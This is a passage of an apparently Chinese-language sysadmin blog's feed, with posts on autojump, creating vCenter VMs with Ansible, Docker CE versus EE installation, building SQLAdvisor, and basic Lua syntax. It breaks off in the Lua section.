    <id>https://t1ger.github.io/2017/04/07/faster-way-to-navigate-your-filesystem-for-CentOS/</id>
    <published>2017-04-07T08:49:43.000Z</published>
    <updated>2017-04-07T08:12:14.582Z</updated>
    
    <content type="html"><![CDATA[<h5 id="What-is-autojump"><a href="#What-is-autojump" class="headerlink" title="What is autojump"></a><b>What is autojump</b></h5><p>autojump is a faster way to navigate your filesystem. It works by maintaining a database of the directories you use the most from the command line.</p>
<p>Directories must be visited first before they can be jumped to.</p>
<h5 id="How-to-Install"><a href="#How-to-Install" class="headerlink" title="How to Install"></a><b>How to Install</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">yum install epel-release</div><div class="line">yum install autojump</div><div class="line"></div><div class="line">如果你是bash，则添加如下到 ~/.bashrc</div><div class="line">[[ -s /etc/profile.d/autojump.bash ]] &amp;&amp; . /etc/profile.d/autojump.bash</div></pre></td></tr></table></figure>
<h5 id="How-to-usage"><a href="#How-to-usage" class="headerlink" title="How to usage"></a><b>How to usage</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">j 目录名字</div><div class="line"></div><div class="line">手动添加目录</div><div class="line">j -a [目录]</div><div class="line"></div><div class="line">手工增加权重</div><div class="line">j -i [权重]</div><div class="line"></div><div class="line">手动减少权重</div><div class="line">j -d [权重] </div><div class="line"></div><div class="line">显示数据库中的统计数据</div><div class="line">j -s</div><div class="line"></div><div class="line">将不存在的目录从数据库中移除</div><div class="line">j --purge</div></pre></td></tr></table></figure>
<p>ref<br><a href="https://github.com/wting/autojump" target="_blank" rel="external">wting/autojump</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;What-is-autojump&quot;&gt;&lt;a href=&quot;#What-is-autojump&quot; class=&quot;headerlink&quot; title=&quot;What is autojump&quot;&gt;&lt;/a&gt;&lt;b&gt;What is autojump&lt;/b&gt;&lt;/h5&gt;&lt;p&gt;autojum
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Deploy VM to vCenter with Ansible</title>
    <link href="https://t1ger.github.io/2017/03/21/Deploy-VM-to-vCenter-with-Ansible/"/>
    <id>https://t1ger.github.io/2017/03/21/Deploy-VM-to-vCenter-with-Ansible/</id>
    <published>2017-03-21T07:19:51.000Z</published>
    <updated>2017-03-21T07:22:21.172Z</updated>
    
    <content type="html"><![CDATA[<p>ready work </p>
<ul>
<li>install ansible<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># yum install epel-release -y</div><div class="line"># yum install python2-pip -y</div><div class="line"># pip install pysphere</div><div class="line"># yum install ansible -y</div><div class="line">[root@localhost ~]# ansible --version</div><div class="line">ansible 2.2.1.0</div></pre></td></tr></table></figure>
</li>
</ul>
<p>ansible config</p>
<ul>
<li><p>create our inventory list</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">[root@localhost vm-playbook]# cat create_hosts </div><div class="line">[dev-vms]</div><div class="line">ans-dev[127:128] disk=&apos;50&apos; datastore=&apos;datastore1&apos; network=&apos;VM Network&apos; memory=&apos;256&apos; cpucount=&apos;2&apos; osid=&apos;centos64Guest&apos;</div><div class="line"></div><div class="line">ans-dev[127:128]= -  actual VM names that we will be creating</div><div class="line">disk= — is the size in GB to create for each VM</div><div class="line">datastore= — name of the datastore to create the VMs on</div><div class="line">network= — name of network (portgroup) to place the VMs on</div><div class="line">memory= — the amount of memory in MB to allocate to the VMs</div><div class="line">cpucount= — the number of vCPU’s to allocate to the VMs</div><div class="line">osid= — the OS Identifier to specify for the OS type…. reference this guide for OSID’s</div></pre></td></tr></table></figure>
</li>
<li><p>create the actual ansible playbook to run to create the VMs</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line">[root@localhost vm-playbook]# cat create_vms.yml </div><div class="line">---</div><div class="line">- hosts: all</div><div class="line">  gather_facts: false</div><div class="line">  connection: local</div><div class="line">  user: root</div><div class="line">  sudo: false</div><div class="line">  serial: 1</div><div class="line"></div><div class="line">  vars_prompt:</div><div class="line">    - name: &quot;vcenter_hostname&quot;</div><div class="line">      prompt: &quot;Enter vcenter hostname&quot;</div><div class="line">      private: no</div><div class="line">      default: &quot;vcsa&quot;</div><div class="line">    - name: &quot;vcenter_user&quot;</div><div class="line">      prompt: &quot;Enter vcenter username&quot;</div><div class="line">      private: no</div><div class="line">    - name: &quot;vcenter_pass&quot;</div><div class="line">      prompt: &quot;Enter vcenter password&quot;</div><div class="line">      private: yes</div><div class="line"></div><div class="line">  vars:</div><div class="line">    datacenter: &apos;whistle&apos;</div><div class="line">    esxi_host: &apos;192.168.100.120&apos;</div><div class="line">    notes: &apos;Created by Ansible&apos;</div><div class="line"></div><div class="line">  tasks:</div><div class="line">    - vsphere_guest:</div><div class="line">        vcenter_hostname: &quot;&#123;&#123; vcenter_hostname &#125;&#125;&quot;</div><div class="line">        username: &quot;&#123;&#123; vcenter_user &#125;&#125;&quot;</div><div class="line">        password: &quot;&#123;&#123; vcenter_pass &#125;&#125;&quot;</div><div class="line">        guest: &quot;&#123;&#123; inventory_hostname &#125;&#125;&quot;</div><div class="line">        state: present</div><div class="line">        vm_extra_config:</div><div class="line">          notes: &quot;&#123;&#123; notes &#125;&#125;&quot;</div><div class="line">          vcpu.hotadd: yes</div><div class="line">          mem.hotadd:  yes</div><div class="line">          #folder: ansible_test</div><div class="line">        vm_disk:</div><div class="line">          disk1:</div><div class="line">            size_gb: &quot;&#123;&#123; disk &#125;&#125;&quot;</div><div class="line">            type: thin</div><div class="line">            datastore: &quot;&#123;&#123; datastore &#125;&#125;&quot;</div><div class="line">            # VMs can be put into folders. The value given here is either the full path</div><div class="line">            # to the folder (e.g. production/customerA/lamp) or just the last component</div><div class="line">            # of the path (e.g. lamp):</div><div class="line">            #folder: production/customerA/lamp</div><div class="line">        vm_nic:</div><div class="line">          nic1:</div><div class="line">            type: e1000</div><div class="line">            network: &quot;&#123;&#123; network &#125;&#125;&quot;</div><div class="line">            network_type: standard</div><div class="line">        vm_hardware:</div><div class="line">          memory_mb: &quot;&#123;&#123; memory &#125;&#125;&quot;</div><div class="line">          num_cpus: &quot;&#123;&#123; cpucount &#125;&#125;&quot;</div><div class="line">          osid: &quot;&#123;&#123; osid &#125;&#125;&quot;</div><div class="line">          scsi: paravirtual</div><div class="line">          vm_cdrom:</div><div class="line">                type: &quot;iso&quot;</div><div class="line">                iso_path: &quot;datastore1/iso/CentOS-Basic7.3-01071715.iso&quot;</div><div class="line">        esxi:</div><div class="line">          datacenter: &quot;&#123;&#123; datacenter &#125;&#125;&quot;</div><div class="line">          hostname: &quot;&#123;&#123; esxi_host &#125;&#125;&quot;</div></pre></td></tr></table></figure>
</li>
<li><p>now ready to run your playbook</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">[root@localhost vm-playbook]# ansible-playbook -i create_hosts create_vms.yml </div><div class="line">SSH password: </div><div class="line">[DEPRECATION WARNING]: Instead of sudo/sudo_user, use become/become_user and make sure become_method is &apos;sudo&apos; (default).</div><div class="line">This feature will be removed in a future release. Deprecation </div><div class="line">warnings can be disabled by setting deprecation_warnings=False in ansible.cfg.</div><div class="line">Enter vcenter hostname [vcsa]: 192.168.100.120</div><div class="line">Enter vcenter username: administrator</div><div class="line">Enter vcenter password: </div><div class="line"></div><div class="line">PLAY [all] *********************************************************************</div><div class="line"></div><div class="line">TASK [vsphere_guest] ***********************************************************</div><div class="line">changed: [ans-dev127]</div><div class="line"></div><div class="line">PLAY [all] *********************************************************************</div><div class="line"></div><div class="line">TASK [vsphere_guest] ***********************************************************</div><div class="line">changed: [ans-dev128]</div><div class="line"></div><div class="line">PLAY RECAP *********************************************************************</div><div class="line">ans-dev127                 : ok=1    changed=1    unreachable=0    failed=0   </div><div class="line">ans-dev128                 : ok=1    changed=1    unreachable=0    failed=0</div></pre></td></tr></table></figure>
</li>
</ul>
<p>ref</p>
<p><a href="http://docs.ansible.com/ansible/vsphere_guest_module.html" target="_blank" rel="external">vsphere_guest - Create/delete/manage a guest VM through VMware vSphere</a><br><a href="http://everythingshouldbevirtual.com/creating-vsphere-vms-using-ansible" target="_blank" rel="external">Creating vSphere VM’s using Ansible</a><br><a href="http://serverfault.com/questions/740193/create-multiple-vmware-guests-with-vsphere-guest-module" target="_blank" rel="external">Create multiple VMware guests with vsphere_guest module</a><br><a href="http://probably.co.uk/managing-vmware-vsphere-guests-with-ansible-tower.html" target="_blank" rel="external">Managing VMware vSphere guests with Ansible Tower</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ready work &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;install ansible&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Docker CE vs Docker EE</title>
    <link href="https://t1ger.github.io/2017/03/14/Docker-CE-vs-Docker-EE/"/>
    <id>https://t1ger.github.io/2017/03/14/Docker-CE-vs-Docker-EE/</id>
    <published>2017-03-14T08:59:18.000Z</published>
    <updated>2017-03-14T08:45:27.454Z</updated>
    
    <content type="html"><![CDATA[<p>Docker2016年就明确了将会在企业级方面重点跟进，惊喜就这样来了，在2017年的3月1号之后，Docker的版本命名开始发生变化，同时将CE版本和EE版本进行分开，而这些也是新安装docker时候发现的，一起简单来看一下具体情况吧</p>
<h5 id="版本说明"><a href="#版本说明" class="headerlink" title="版本说明"></a><b>版本说明</b></h5><p>在此之前docker的最新版本更新到docker1.13，而在1.13的基础之上，在2017年的3月1号开始，版本的格式变为如下</p>
<p>项目    说明<br>版本格式    YY.MM<br>stable版本    每个季度发行<br>edge版本    每个月发行<br>当前CE版本    17.03.0-ce</p>
<p>同时将Docker分成CE和EE2个版本。CE版本即社区版(免费，支持周期三个月),EE企业版，强调安全，付费使用。<br>当前的CE版本为17.03.0-ce，基于V1.13.0.主要修复错误，没有重大功能增加，API亦保持不变。</p>
<h5 id="安装CE版本的Docker"><a href="#安装CE版本的Docker" class="headerlink" title="安装CE版本的Docker"></a><b>安装CE版本的Docker</b></h5><p>安装参看官方提供Manual如下</p>
<p>项目    详细<br>CENTOS安装CE版    <a href="https://store.docker.com/editions/community/docker-ce-server-centos?tab=description" target="_blank" rel="external">https://store.docker.com/editions/community/docker-ce-server-centos?tab=description</a><br>也可以使用Easypack下面提供的脚本，只是将上面的内容顺次写进去，加上enable和start以及firewall的关闭等操作而已。</p>
<p>项目    详细<br>CENTOS安装CE（Easypack）版    <a href="https://github.com/liumiaocn/easypack/tree/master/docker" target="_blank" rel="external">https://github.com/liumiaocn/easypack/tree/master/docker</a></p>
<h5 id="安装FAQ"><a href="#安装FAQ" class="headerlink" title="安装FAQ"></a><b>安装FAQ</b></h5><p>在yum 安装时候，报出Peer’s Certificate has expired的错误</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">failure: repodata/repomd.xml from docker-ce-stable: [Errno 256] No more mirrors to try.</div><div class="line">https://download.docker.com/linux/centos/7/x86_64/stable/repodata/repomd.xml: [Errno 14] curl#60 - &quot;Peer&apos;s Certificate has expired.&quot;</div></pre></td></tr></table></figure>
<p>搜索很久，终于看到有位兄弟碰到过，原来是本地时间不正确造成的，详情见<a href="https://xuxinkun.github.io/2016/04/21/curl-ca-problem/" target="_blank" rel="external">这里</a></p>
<p>进行一次ntp同步时间同步，问题解决<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ntpdate pool.ntp.org</div></pre></td></tr></table></figure></p>
<p>ref<br><a href="https://docs.docker.com/engine/installation/linux/centos/" target="_blank" rel="external">Get Docker for CentOS</a><br><a href="https://xuxinkun.github.io/2016/04/21/curl-ca-problem/" target="_blank" rel="external">记一次解决curl https证书问题</a><br><a href="https://github.com/tiny1990/aboutTest" target="_blank" rel="external">docker的环境部署</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Docker2016年就明确了将会在企业级方面重点跟进，惊喜就这样来了，在2017年的3月1号之后，Docker的版本命名开始发生变化，同时将CE版本和EE版本进行分开，而这些也是新安装docker时候发现的，一起简单来看一下具体情况吧&lt;/p&gt;
&lt;h5 id=&quot;版本说明&quot;&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SQLAdvisor简明教程</title>
    <link href="https://t1ger.github.io/2017/03/13/SQLAdvisor%E7%AE%80%E6%98%8E%E6%95%99%E7%A8%8B/"/>
    <id>https://t1ger.github.io/2017/03/13/SQLAdvisor简明教程/</id>
    <published>2017-03-13T03:49:52.000Z</published>
    <updated>2017-03-13T03:46:10.352Z</updated>
    
    <content type="html"><![CDATA[<h5 id="简介"><a href="#简介" class="headerlink" title="简介"></a><b>简介</b></h5><p>SQLAdvisor是由美团点评公司技术工程部DBA团队（北京）开发维护的一个分析SQL给出索引优化建议的工具。它基于MySQL原生态词法解析，结合分析SQL中的where条件、聚合条件、多表Join关系 给出索引优化建议<br>主要功能：输出SQL索引优化建议</p>
<h5 id="SQLAdvisor安装"><a href="#SQLAdvisor安装" class="headerlink" title="SQLAdvisor安装"></a><b>SQLAdvisor安装</b></h5><ul>
<li><p>安装依赖项</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1. 配置percona56 yum源: </div><div class="line">   yum install http://www.percona.com/downloads/percona-release/redhat/0.1-3/percona-release-0.1-3.noarch.rpm</div><div class="line"></div><div class="line">2. yum | apt-get  install cmake libaio-devel libffi-devel glib2 glib2-devel</div><div class="line">3. yum | apt-get  install --enablerepo=Percona56 Percona-Server-shared-56</div></pre></td></tr></table></figure>
</li>
<li><p>拉取最新代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/Meituan-Dianping/SQLAdvisor.git</div></pre></td></tr></table></figure>
</li>
<li><p>编译依赖项sqlparser</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">1. cmake -DBUILD_CONFIG=mysql_release -DCMAKE_BUILD_TYPE=debug -DCMAKE_INSTALL_PREFIX=/usr/local/sqlparser ./</div><div class="line">2. make &amp;&amp; make install</div><div class="line"></div><div class="line">编译sqladvisor时依赖perconaserverclient_r, 因此需要安装Percona-Server-shared-56</div><div class="line">有可能需要配置软链接例如:</div><div class="line">1. cd /usr/lib64/ </div><div class="line">2. ln -s libperconaserverclient_r.so.18 libperconaserverclient_r.so</div></pre></td></tr></table></figure>
</li>
<li><p>安装SQLAdvisor源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1. cd SQLAdvisor/sqladvisor/</div><div class="line">2. cmake -DCMAKE_BUILD_TYPE=debug ./</div><div class="line">3. make</div><div class="line">4. 在本路径下生成一个sqladvisor可执行文件，这即是我们想要的。</div></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="SQLAdvisor使用"><a href="#SQLAdvisor使用" class="headerlink" title="SQLAdvisor使用"></a><b>SQLAdvisor使用</b></h5><ul>
<li><p>–help输出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">[root@localhost sqladvisor]# ./sqladvisor --help</div><div class="line">Usage:</div><div class="line">  sqladvisor [OPTION...] sqladvisor</div><div class="line"></div><div class="line">SQL Advisor Summary</div><div class="line"></div><div class="line">Help Options:</div><div class="line">  -?, --help              Show help options</div><div class="line"></div><div class="line">Application Options:</div><div class="line">  -f, --defaults-file     sqls file</div><div class="line">  -u, --username          username</div><div class="line">  -p, --password          password</div><div class="line">  -P, --port              port</div><div class="line">  -h, --host              host</div><div class="line">  -d, --dbname            database name</div><div class="line">  -q, --sqls              sqls</div><div class="line">  -v, --verbose           1:output logs 0:output nothing</div></pre></td></tr></table></figure>
</li>
<li><p>命令行传参调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">./sqladvisor -h xx  -P xx  -u xx -p &apos;xx&apos; -d xx -q &quot;sql&quot; -v 1</div><div class="line"></div><div class="line">注意：命令行传参时，参数名与值需要用空格隔开</div></pre></td></tr></table></figure>
</li>
<li><p>配置文件传参调用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">$&gt; cat sql.cnf</div><div class="line">[sqladvisor]</div><div class="line">username=xx</div><div class="line">password=xx</div><div class="line">host=xx</div><div class="line">port=xx</div><div class="line">dbname=xx</div><div class="line">sqls=sql1;sql2;sql3....</div><div class="line"></div><div class="line">cmd: ./sqladvisor -f sql.cnf  -v 1</div></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="常见错误FAQ"><a href="#常见错误FAQ" class="headerlink" title="常见错误FAQ"></a><b>常见错误FAQ</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">我已经安装了libaio-devel库：</div><div class="line">-- Running cmake version 2.8.12.2</div><div class="line">CMake Error at cmake/build_configurations/mysql_release.cmake:46 (MESSAGE):</div><div class="line">          aio is required on Linux, you need to install the required library:</div><div class="line">            Debian/Ubuntu:              apt-get install libaio-dev</div><div class="line">            RedHat/Fedora/Oracle Linux: yum install libaio-devel</div><div class="line">            SuSE:                       zypper install libaio-devel</div><div class="line">          If you really do not want it, pass -DIGNORE_AIO_CHECK to cmake.          </div><div class="line">Call Stack (most recent call first):</div><div class="line">  CMakeLists.txt:131 (INCLUDE)</div><div class="line">  </div><div class="line">原因：刚开始第一次执行cmake的时候就产生了CMakeCache.txt，</div><div class="line">这个时候我并没有安装libaio-devel库，</div><div class="line">然后继续安装依赖库后再执行cmake其实读取的依然是前面生成的cache文件,</div><div class="line">导致cmake判断libaio-devel一直未被安装。</div><div class="line"></div><div class="line">解决：我们rm删除CMakeCache.txt文件后重新执行cmake命令</div></pre></td></tr></table></figure>
<p>ref<br><a href="https://github.com/Meituan-Dianping/SQLAdvisor/blob/master/doc/QUICK_START.md" target="_blank" rel="external">QUICK_START</a><br><a href="https://github.com/Meituan-Dianping/SQLAdvisor/blob/master/doc/THEORY_PRACTICES.md" target="_blank" rel="external">THEORY_PRACTICES</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;&lt;b&gt;简介&lt;/b&gt;&lt;/h5&gt;&lt;p&gt;SQLAdvisor是由美团点评公司技术工程部DBA团队（北京）开发维护的一个分析SQL给出索引优化建议的工具。它基于MySQ
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>lua基本语法</title>
    <link href="https://t1ger.github.io/2017/02/14/lua%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
    <id>https://t1ger.github.io/2017/02/14/lua基本语法/</id>
    <published>2017-02-14T09:46:12.000Z</published>
    <updated>2017-02-17T10:00:12.371Z</updated>
    
    <content type="html"><![CDATA[<h5 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a><b>关键字</b></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">and	break	do	else	elseif</div><div class="line">end	false	for	function	if</div><div class="line">in	local	nil	not	or</div><div class="line">repeat	return	then	true	until	while</div></pre></td></tr></table></figure>
<h5 id="运算"><a href="#运算" class="headerlink" title="运算"></a><b>运算</b></h5><ul>
<li><p>数字运算</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">支持+，-，*，/，…… 比如2^2 结果为4,2^4结果为16</div><div class="line">连接两个字符串，用&quot;..&quot;运算符</div></pre></td></tr></table></figure>
</li>
<li><p>赋值运算</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a,b,c,d=1,2,3,4  --多变量一起赋值</div><div class="line">a,b=b,a --交换变量功能</div><div class="line">在默认情况下，变量是全局的。如果需要使用局部变量，使用关键字loacal</div><div class="line">local a,b,c =1,2,3 --a,b,c都是局部变量</div></pre></td></tr></table></figure>
</li>
<li><p>逻辑运算</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">and,or,not</div><div class="line">在lua 中，只有false和nil被计算为false,其他数据都被计算为true,0也是true</div><div class="line">and和or 的运算结果不是true和false,而是和它的两个操作数相关</div><div class="line"></div><div class="line">a and b :如果a为false,则返回a,否则返回b</div><div class="line">a or  b :如果a为true,则返回a,否则返回b</div><div class="line"></div><div class="line">模拟c语言中的语句：x=a?b:c,在lua中，可以写成：x=a and b or c都是局部变量</div><div class="line">有用的语句：x=x or v,相当于： if not x then x=v end</div></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="条件判断语句"><a href="#条件判断语句" class="headerlink" title="条件判断语句"></a><b>条件判断语句</b></h5><ul>
<li><p>if</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">if condition then</div><div class="line">		...</div><div class="line">elseif condition then</div><div class="line">		... else ...</div><div class="line">end</div></pre></td></tr></table></figure>
</li>
<li><p>repeat</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">repeat ... until condition</div></pre></td></tr></table></figure>
</li>
<li><p>while</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">while condition</div><div class="line">do</div><div class="line">	...</div><div class="line">end</div></pre></td></tr></table></figure>
</li>
<li><p>for</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">for var=v1,vn,step</div><div class="line">do</div><div class="line">	...</div><div class="line">end</div><div class="line"></div><div class="line">for var1,var2,... varn in table</div><div class="line">do</div><div class="line">	...</div><div class="line">end</div></pre></td></tr></table></figure>
</li>
<li><p>闭包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">eg one.</div><div class="line">function newCounter()</div><div class="line">	local i=0</div><div class="line">	return function()  -- anonymous function</div><div class="line">		i=i+1</div><div class="line">			return i</div><div class="line">	end</div><div class="line">end</div><div class="line"></div><div class="line">c1=newCounter()</div><div class="line">print(c1()) --&gt;1</div><div class="line">print(c1()) --&gt;2</div><div class="line"></div><div class="line">eg two.</div><div class="line">function myPower(x)</div><div class="line">	return function(y) return y^x end</div><div class="line">end</div><div class="line"></div><div class="line">power2=myPower(2)</div><div class="line">power3=myPower(3)</div><div class="line"></div><div class="line">print(power2(4)) </div><div class="line">print(power3(5))</div></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="常用结构"><a href="#常用结构" class="headerlink" title="常用结构"></a><b>常用结构</b></h5><ul>
<li>table<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">table 是lua的重要数据类型</div><div class="line">table 类似于 python中的字典</div><div class="line">table 只能通过构造式来创建</div><div class="line"></div><div class="line">lua code</div><div class="line"></div><div class="line">tab=&#123;a=10,b=20,c=30,d=40&#125;</div><div class="line">print(tab[&quot;a&quot;])</div><div class="line"></div><div class="line">comment:</div><div class="line">a)table中的每项要求是 key=value的形式</div><div class="line">b)key只能是字符串，这里的a,b,c,d都是字符串，但是不能加引号</div><div class="line">c)通过key来访问table的值，这时候 a必须加引号</div><div class="line"></div><div 